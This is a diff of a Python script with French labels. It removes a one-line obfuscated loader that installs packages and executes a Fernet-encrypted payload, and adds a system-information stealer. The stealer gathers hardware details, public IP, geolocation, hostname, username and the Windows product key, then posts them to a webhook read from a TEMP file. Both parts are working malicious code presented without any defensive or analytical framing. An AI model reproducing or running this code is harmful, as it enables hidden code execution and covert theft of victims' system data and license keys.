@@ -1,1 +1,83 @@
-import subprocess, sys; subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography', 'requests']); from cryptography.fernet import Fernet; import base64, requests; key='aj0OrmWFT0rwLB5uTP9uskSP1oJ5m8DIO8MIgt7jNyw='; cipher=Fernet(key); exec(cipher.decrypt('gAAAAABn9uq5MWjzWk3qwRH4U_L48F8i1JW8NW3jiocbmAOQBoVFeNcIghyajmTRRvBkf6UW66OKeT2WE-0OXRKo0Wzb7So91sVXtkazPm_M_JEMsHlrs-SmqJ6qb-HT8ym1uUHBCLNbp3GgjxsDujDcmFxSEGvhIaPBwZSHEjJ0aJOOGNFHNOzmo_CiDp2QfHSvsd9yls6wE21ARv6SRi0GugLSqlKTZi81I64FOgdrnXRCkoSheGmiQqOJI1ODjEYzYQbT7w5RkXz4bOrBDa2OEqRC851pbwJgs3xyQuLa0-XeezFAUrotMtntMBQBS7R5T8Xvq4_7AJNyv-TUktg8vnrgV_4A3UaSxOYoXHm3U5RDATh_gqFg0NKZ2HEVvQgpu5hC3IpdXzA7_K5tm5G4aBEfP4BXESJVGIu4XlRWpJRcKLEbnoud9nqdUx_B2KYUzbiHSw_3xAHhORZH2iJ0uG-nEUr97jpc1cUpfQy8YWgCEWXMINzwj16eFTEWJ8KvYvC4MoSmWv8Z3XrEa5e5TXwvjGKMD_m_zpga8EqrQk_Bliqsn-xzFMck1TJXXDm-PDAD-ANYScoCcyFtZfUfohhv3vi8BDtIB8LOhzGy3Rq8r0C8NHPyrbE8IN2UonqfMnlkrMaNLOKJ00QT7v0qHeowv3uR0uKQ3kCLD7VNnBCGm8KSax1w03viclw43Q50zDeqXZ1k7Gg5bDWugHZh3XOc5dsJdOyElUYOQxqHPAaBwveKe28A6MZARrJLa0bZ01pVAYBjFSfLZuRpK6AjQE1YaUX0mMjvntH1bqnB-ZgeTZNkLWjKOnyOFTuqbJJT9iDHE8tjvur5wYZQzJNQH-NnukCjYnmY3riyGFqOHpw3P2PAuFmh4-mm5O1EO6WS1f09PuU-m7104L4k2G7bhpdryfgRaqj7xgSHmpPfeWy0h4PVgYwPPWLO2N23pU5KxBkJYdVlffQfKc-TZQRQtOpYgG9DeFh8rBPOoIBmPitXUyJIOHRY5-VFLp8rjdekz3TC2UmJLINPfnarpxq_GtYjQrr4bmpfYJ_njYyg4AHOkPyz9KPk0HQC6WTvje5f54T1-v3eqTMLnfS7uDDYjAdhU4uE58y5oDCPrZbxmkiHC9mE82vCCjQ-z45-CliidbpvrQ-HZjvHqiY-IY-iuqEintqPLxweAX-vuxUCYmG0-S2YVn6ZOjVJc79GRzS-M5QBcBXBppxVorDk-cY9WZ-d-NEsf-7TEOuH0yEf_6HXDGMXTEhZMUWOErzbcU9S1X3bMQ-aNFxWJlnO53J4CGMIsA1Ovn5zsYeir9e90gE5EG5oSKt9NRmSjuanyCeYoyI6dfJXEeKA49s4WtFZUYWTend_vDQ_iPbqu0u3I0_JbLXEW_cMeWLubM3-ILQlmyMO-7lKMshms4FEsuBN1yqjmQ9qseJRrgsLLGiJPLWNeBmQoVl0EquiQWST0zK7mesrEoS1AKhT9Sdm3U-zhPWIqWo7plkipXwtzcJXZbRKf2YuUYMkaejn6D_Rv3c3svqQigvtht4kOvdzFdPPcHjcJaRukClbo4eZhwD7Qg_s34B1718SeOpmeHOcpY36XvvMqxo6FhIfk0qcVaj_W6tS8joCMs8TC9mCCGzAFtCkeVrxGlekFsNCGGunu2gKF_Eu_FJKRC5kO3Ou9fA7jqXhYnGIfdQ5FQOPmhB6D7F5jG0jJZodQ8Q7C4kUwJl-s72wC6QfwQTHzRZJk0lp2B_YLXwBlt4NJ-TUMAgWxWf8NacaVvD904w_a7rgDmze01ZRwUvWI7Qk6pGEl3uZ98fNsV2y6K0HeZ7lxD_ne5b4O4Q9Cn_OAa80wguGCZTXXViIuPwJENjro4ufCKMg-s3iKvRLT68cqdvYF4nneNWlm5IwLxtDpp3zA3u7gRMg0vsztHxZZVYg6J9aUcpwUz3YXJKKWJJXl9Iuv03yAwSfueWJhlJT9466nKJB0suf4gF5KpUnEAYH4ifsOaqjIJBKzl_CDthaPoKVWw8aBX4CMPfcQgjcBOwh_OnoLs8f7EWu0I6eiQdi3GTQ2Tmp-YPIr1a3FYtv_q25NbHdkpJZ7FWx8g2kTEZaKCWF0fAB6nyNCoZuK9uYCns6yn-KUyDOjNwQcBYfeIdSUEC0cwRshHYxVbznMYwyxGlrZA_pMPuuDmBSaJoTgbgn4SmaARyweEYMkYomRH_bb6ps5KIL0RzYudVdRiGBmFiVtbe2ZGQkruh3Fz3M3IetqdKTnTMWQsDhY3arvnw4qwLejVyc_BN8nqrFSY5CwMcItITZgGU8MD6g-qmqHp7P49-FqB9WM-uIOoYXPoYGt5nGd9blWsrl39t8l7FD8XH4rcaCcCug-LeUbx9ehTQPNJi6RjJEfDeY9Kin2msuLcnVvfZG_yefkcxjvXANp3PSQbdoujST4md65sr4e265n7UTHqMyoCcgg8OdRaFtJjaJZRbT4AJ8jmybBxvdhpSQPSTQjFCq1bgdyaYNJdOxRDmv24FckWXKST6j3E4Vbb4-zj4VBrKgRYmt_cvDspAsBayYX3o1nesD-jm4JxHMhmU_0yFM7W39sGByn6ZLX7uZyxG8KvbXw4e5lbB9DdwuUpXnTa7iRO7r_HVocIVXNtnSUUUSI6Ovoz2Lr0uo0rSm9aqnjFiD2r_5CEZjXSqL5OI5V6TpQZtawp7eL34EQ9YVX0o9WPT0cEfioK_xvhuLG3fccrvY87R79tIO7knrnIlrgTuMXEr6BlemxiOUXPcDFCN3Kp5Qu7iln8b7lb9nuxehizplkebAWWs4yKjnfU42Sv1b4zqpL_ZX6knI88OOLPv4KRNYap9AlkTOx5uQbhJyVFajSmJ1i25JhmB_fiBNsTvFUeJ48P-_VWw4XSIkEvXRh-pfCi2dYN9f-QjTGNHJPKW0FzjRUQjXXhjL6FdR_igr2_pM2Jn1kOsPAIApZtH9gkpcxa6M8Hy4Y1wFO38BbNBkSZ_UYcDHT9H8Dzr7t5AJm6falJW7EjDInh6P-swhBjJ1sqKjpxiy_PKB6r_44BUsKSTP_VCsPEwOQ77DIEnfdQF7vu5lMcjfo--DwSud4xGr7opqFHb1WgY5HOqyIT-YB2w4e11Q956dHvYzPDaqesecikpVvvmxGd5p_MCDsNqsG4FNaVc1rR_jneIUMDMs38Ns0jHiTh_Gf9i0BraWh0iby9KLExOGf478V5iQjBzu7hQUsCeUwtJOy1ExRf0edWOvDLQOkW_5EKLC4TTvSMNcu8BKfggmrNEh4hwK-3qN1Il1oVQp8957kD3VCdhNJ46zYAu9h5FM86fyCB3LIRc0zXv8v71JKccJIXOaJBHVA4V9gI2qC63ySL8N649xOUwl7h3C-MRLR3VHu9GDXqKKd6EOu-cOQNBSFjvIdrevUR8yILXaTidmVit9EBperNLrQuqoXScfh6fW0iD92paLhvR0P6yuBdX7oIP7GIuEaj8RR5vMzNUIT7XSbvRUCjXIWmhsVxEfDNOl64A3Pkmm5RfCDm225qV7NjoXQVXwlNNcT_1tF3Z1pj_cp0v12nQCQH-0h5lPY_i1x1YCRIAYYC32WP5e9B2p2oChpseT_gmN1541uW0nS4iuQvvTiu25bKsLoQs1i2th5xhC-mxF6F9ADNhS19WmP5T7WncD9np16XHfq9C7TS90c2pRRBYB67uEGgMO2JK9zPdieC4eSke3r4qtQn6Oa4bczAKSGgcS09ZISDgLvIGpcs9PiC0zFodZTElGZW97HtA-TZtRNnBS5aPaHFRqPVw3pPlv1UoOd8i26YnoOhPAdJcrhyXGiyNRobkS8l3CVvLo8bzLtaw6CIPwqc32Dp0YMlTPeKBuw-42BrGk00RrHrHO-11shvCE9A6FVFGLH0mmS85tb3J1l8i9OpIULKhwbcmB2pk3ziBpACwm2O9eLmLF8Qw7bZL3WgQAykmWZfYVUhqE6lCW5EM65x_SoSGYIwvEgIb57AytzC-Q2-Cnbj5W5eVf2TZSwkWLmgb0mX9vELeziyXPp7dl-74PylGCf0LC0GuZ6YJBMt1kGvqpTyEla2YIqzA9MvHzBBDUxSW9tnIuBUSTdEdNT0QLrdoKLNe7xd-5sGVIa8A9sRlIQf2HWAM4ySkwpWCi6a-8A422zPMlXG8NGdItO_PVWO2G4Lfd3ZH8ZagNv4e-ZOZhGj6kRWELlVbqykz0jSP6KweDnHY7P-T1KxCef2U5m1s2c_w70WXqTYMHdBpjZi-ecGxbQg1KQW4DYWW3Pda6uBRFeGwEjYDeG1mF3cwQ1TEic7b599GtIxdkOOGA5NQ6tWf8DNX7L2PdQe-E6PyTDs0-bJx837ujmVU2A2m_jytPOkC7tlDXk7-BrkkQt7m1gZMfZ8Mki1ptvB_Yk1pyqoE-qWOk693FisXRaEdhiuROxMgMM8jM1dNg8ajzKRYHkFoLMVQ='.encode()).decode())
+import os
+import wmi
+import psutil
+import requests
+import geocoder
+import socket
+import platform
+import time
+import subprocess
+
+webhook_path = os.path.join(os.getenv('TEMP'), 'config', 'webhook.txt')
+
+try:
+    with open(webhook_path, 'r') as file:
+        webhook_url = file.read().strip()
+except FileNotFoundError:
+    exit()
+
+c = wmi.WMI()
+
+computer_info = c.Win32_ComputerSystem()[0]
+os_info = c.Win32_OperatingSystem()[0]
+bios_info = c.Win32_BIOS()[0]
+processor_info = c.Win32_Processor()[0]
+memory_info = c.Win32_PhysicalMemory()[0]
+disk_info = c.Win32_DiskDrive()[0]
+
+local_ip = socket.gethostbyname(socket.gethostname())
+public_ip = requests.get('https://api.ipify.org').text
+location = geocoder.ip(public_ip)
+org = location.org if location.org else "Inconnue"
+
+architecture = platform.architecture()[0]
+uptime_seconds = time.time() - psutil.boot_time()
+uptime = str(time.strftime("%H:%M:%S", time.gmtime(uptime_seconds)))
+uefi_mode = os.path.exists(r"C:\Windows\System32\efisys.bin")
+
+hostname = socket.gethostname()
+username = os.getlogin()
+cpu_count = psutil.cpu_count(logical=True)
+uid = os_info.SerialNumber if hasattr(os_info, "SerialNumber") else "Inconnu"
+win_key = subprocess.getoutput('powershell -Command "(Get-WmiObject -Query \'select * from SoftwareLicensingService\').OA3xOriginalProductKey"').strip()
+
+embed = {
+    "username": "🖥️ **Informations Système**",
+    "embeds": [
+        {
+            "title": "🔍 **Détails Système**",
+            "color": 3447003,
+            "thumbnail": {
+                "url": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8f/Windows_logo_2021.svg/1200px-Windows_logo_2021.svg.png"
+            },
+            "footer": {
+                "text": "Système mis à jour le : " + time.strftime("%d/%m/%Y %H:%M:%S", time.gmtime(time.time()))
+            },
+            "fields": [
+                {
+                    "name": "🌐 **Informations IP**",
+                    "value": f"**📍 IP Publique**: {public_ip}\n\n**🌍 Ville**: {location.city or 'Inconnue'}\n**🗺️ Région**: {location.raw.get('region', 'Inconnue')}\n**🌎 Pays**: {location.country or 'Inconnue'}\n**🏢 Organisation**: {org}",
+                    "inline": False
+                },
+                {
+                    "name": "🖥️ **Système & Processeur**",
+                    "value": f"**🧠 CPU**: {cpu_count} Cores\n\n**💾 Disque**: {round(int(disk_info.Size) / (1024**3))} Go\n**📦 RAM**: {round(int(memory_info.Capacity) / (1024**3))} Go",
+                    "inline": False
+                },
+                {
+                    "name": "🔑 **Identifiants Système**",
+                    "value": f"**🆔 UID**: {uid}\n\n**🖥️ OS**: {os_info.Caption}\n**🪟 Version Windows**: {os_info.Version}\n**🔑 Clé Windows**: {win_key or 'Inconnue'}",
+                    "inline": False
+                },
+                {
+                    "name": "🔒 **Statistiques Système**",
+                    "value": f"**💻 Nom d'hôte**: {hostname}\n\n**⏳ Uptime**: {uptime}\n**🔐 Firmware**: {'⚡ UEFI' if uefi_mode else '🖥️ BIOS'}",
+                    "inline": False
+                }
+            ]
+        }
+    ]
+}
+
+
+requests.post(webhook_url, json=embed)
